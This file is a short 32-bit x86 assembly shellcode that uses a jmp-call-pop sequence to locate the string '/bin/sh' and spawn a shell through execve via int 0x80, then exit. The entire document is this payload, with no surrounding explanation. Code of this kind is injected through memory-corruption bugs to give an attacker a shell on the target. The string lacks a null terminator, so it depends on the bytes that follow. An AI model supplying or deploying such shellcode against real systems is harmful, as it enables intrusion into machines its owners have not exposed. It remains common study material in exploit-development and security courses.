BITS 32

; execve('/bin/sh',0,0)

jmp short _one

_two:
; '/bin/sh'
pop ebx
; syscall number
xor eax, eax
mov al, 0xb
; argv=NULL
xor ecx, ecx
; envp=NULL
xor edx, edx
int 0x80

mov al, 0x1
xor ebx, ebx
int 0x80

_one:
; push address of '/bin/sh' to stack
call _two
db '/bin/sh'
